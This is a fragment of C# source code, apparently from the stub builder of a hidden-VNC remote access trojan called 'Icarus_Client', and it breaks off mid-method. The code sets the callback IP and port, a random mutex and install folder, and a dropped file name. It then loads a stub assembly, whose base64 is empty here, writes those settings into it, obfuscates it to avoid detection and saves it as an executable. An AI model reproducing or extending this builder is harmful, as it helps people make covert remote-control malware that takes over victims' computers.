		public void Build()
		{
			if (string.IsNullOrWhiteSpace(this.txtIP.Text) || string.IsNullOrWhiteSpace(this.txtPORT.Text))
			{
				using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
				{
                    socket.Connect("8.8.8.8", 65530);
					string text = (socket.LocalEndPoint as IPEndPoint).Address.ToString();
					this.txtIP.Text = string.Empty;
					this.txtIP.Text = text;
				}
				this.txtPORT.Text = HVNC.Properties.Settings.Default.PORT;
				this.txtMutex.Text = StubBuilder.RandomMutex(9);
                this.txtIdentifier.Text = "Icarus_Client";
				this.txtFolder.Text = StubBuilder.RandomMutex(9);
                this.txtFilename.Text = "birdbrainmofo.exe";
			}
            ModuleDefMD moduleDefMD = null;
            try
            {
                if (this.chkNet2.Checked)
                {
                    using (moduleDefMD = ModuleDefMD.Load(Convert.FromBase64String("")))
                    {
                        SaveFileDialog saveFileDialog2 = new SaveFileDialog();
                        try
                        {
                            saveFileDialog2.Filter = ".exe (*.exe)|*.exe";
                            saveFileDialog2.InitialDirectory = Application.StartupPath;
                            saveFileDialog2.OverwritePrompt = false;
                            if (saveFileDialog2.ShowDialog() == DialogResult.OK)
                            {
                                this.button1.Enabled = false;
                                this.WriteSettings(moduleDefMD);
                                moduleDefMD = Obfuscate.obfuscate(moduleDefMD);
                                this.listBox2.Items.Add("Encrypting stub...");
                                moduleDefMD.Write(saveFileDialog2.FileName);
                                moduleDefMD.Dispose();
